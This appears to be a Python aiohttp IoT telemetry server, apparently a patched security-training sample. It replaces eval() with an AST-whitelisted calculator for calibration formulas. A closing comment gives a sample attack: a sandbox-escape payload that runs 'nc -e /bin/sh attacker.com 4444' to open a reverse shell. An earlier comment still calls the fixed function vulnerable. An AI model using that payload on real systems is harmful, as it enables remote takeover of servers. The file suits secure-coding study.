import os
import json
import asyncio
import sqlite3
import logging
from aiohttp import web
from datetime import datetime

# Configure logging for the IoT Edge Telemetry Hub
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - IoTHub - %(levelname)s - %(message)s'
)
logger = logging.getLogger("AioHttpIoT")

DB_FILE = "iot_telemetry.db"

def init_telemetry_db():
    """Initializes the SQLite database for storing sensor telemetry."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE telemetry (
            record_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            sensor_id TEXT NOT NULL,
            raw_value REAL NOT NULL,
            calibrated_value REAL NOT NULL
        )
    ''')

    conn.commit()
    conn.close()
    logger.info("IoT telemetry database initialized.")

def store_telemetry(sensor_id: str, raw: float, calibrated: float):
    """Persists a telemetry reading to the local database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO telemetry (sensor_id, raw_value, calibrated_value) VALUES (?, ?, ?)",
            (sensor_id, raw, calibrated)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error storing telemetry for {sensor_id}: {e}")

import ast
import operator

def apply_calibration(raw_value: float, calibration_rule: str) -> float:
    """
    SECURE: Uses the ast module to safely parse and evaluate calibration math 
    instead of the dangerous eval() function. This prevents Code Injection (CWE-94).
    """
    logger.debug(f"Applying secure calibration rule: {calibration_rule} to raw value: {raw_value}")
    
    # Define explicitly allowed mathematical operators
    allowed_operators = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.USub: operator.neg,
        ast.UAdd: operator.pos
    }

    # Define explicitly allowed variables for the calibration formula
    allowed_vars = {
        "val": float(raw_value)
    }

    def safe_eval(node):
        """Recursively walks the AST and strictly limits allowed operations."""
        if isinstance(node, ast.Expression):
            return safe_eval(node.body)
            
        elif isinstance(node, ast.Constant):  # Python 3.8+ handles numbers via Constant
            if isinstance(node.value, (int, float)):
                return float(node.value)
            raise ValueError("Only numeric constants are allowed.")
            
        elif isinstance(node, ast.Num):  # Fallback for Python < 3.8
            return float(node.n)
            
        elif isinstance(node, ast.BinOp):
            left_val = safe_eval(node.left)
            right_val = safe_eval(node.right)
            op_type = type(node.op)
            if op_type in allowed_operators:
                return allowed_operators[op_type](left_val, right_val)
            raise ValueError(f"Unsupported binary operator: {op_type.__name__}")
            
        elif isinstance(node, ast.UnaryOp):
            operand_val = safe_eval(node.operand)
            op_type = type(node.op)
            if op_type in allowed_operators:
                return allowed_operators[op_type](operand_val)
            raise ValueError(f"Unsupported unary operator: {op_type.__name__}")
            
        elif isinstance(node, ast.Name):
            if node.id in allowed_vars:
                return allowed_vars[node.id]
            raise ValueError(f"Unknown or forbidden variable: {node.id}")
            
        else:
            raise ValueError(f"Unsupported expression construct: {type(node).__name__}")

    try:
        # 1. Parse the string into an Abstract Syntax Tree (AST) in 'eval' mode.
        # This acts as a parser, not an executor, making it safe from injection.
        tree = ast.parse(calibration_rule, mode='eval')
        
        # 2. Traverse the AST and perform arithmetic safely
        result = safe_eval(tree)
        
        return float(result)
        
    except SyntaxError as e:
        logger.error(f"Syntax error in calibration rule: {e}")
        return float(raw_value)
    except ValueError as e:
        logger.error(f"Security/Validation restriction triggered: {e}")
        return float(raw_value)
    except ZeroDivisionError:
        logger.error("Division by zero attempted in calibration rule.")
        return float(raw_value)
    except Exception as e:
        logger.error(f"Unexpected error evaluating secure calibration: {e}")
        return float(raw_value)

async def websocket_handler(request):
    """Handles persistent WebSocket connections from edge devices."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    peer_ip = request.remote
    logger.info(f"New IoT edge device connected via WebSocket from {peer_ip}.")

    async for msg in ws:
        if msg.type == web.WSMsgType.TEXT:
            try:
                payload = json.loads(msg.data)
                sensor_id = payload.get("sensor_id", "unknown")
                raw_val = payload.get("value")
                rule = payload.get("calibration_rule")

                if raw_val is None or not rule:
                    await ws.send_json({"error": "Missing 'value' or 'calibration_rule' in payload"})
                    continue

                # Pass the untrusted string directly to the vulnerable function
                calibrated_val = apply_calibration(raw_val, rule)
                
                store_telemetry(sensor_id, raw_val, calibrated_val)

                await ws.send_json({
                    "status": "recorded",
                    "sensor_id": sensor_id,
                    "calibrated_value": calibrated_val
                })
                
            except json.JSONDecodeError:
                await ws.send_json({"error": "Payload must be valid JSON"})
                
        elif msg.type == web.WSMsgType.ERROR:
            logger.error(f"WebSocket connection closed with exception {ws.exception()}")

    logger.info(f"IoT edge device {peer_ip} disconnected.")
    return ws

async def init_app():
    """Application factory for aiohttp."""
    init_telemetry_db()
    app = web.Application()
    app.router.add_get('/ws/telemetry', websocket_handler)
    return app

if __name__ == '__main__':
    # Example Malicious Trigger:
    # 1. Attacker connects a WebSocket client to ws://127.0.0.1:8081/ws/telemetry
    # 2. Attacker sends a JSON payload with a sandbox-escaping Python payload in the rule:
    #
    # {
    #   "sensor_id": "temp_probe_01",
    #   "value": 22.5,
    #   "calibration_rule": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"
    # }
    
    logger.info("Starting aiohttp IoT Edge Telemetry Hub on http://0.0.0.0:8081")
    web.run_app(init_app(), host='0.0.0.0', port=8081, access_log=None)
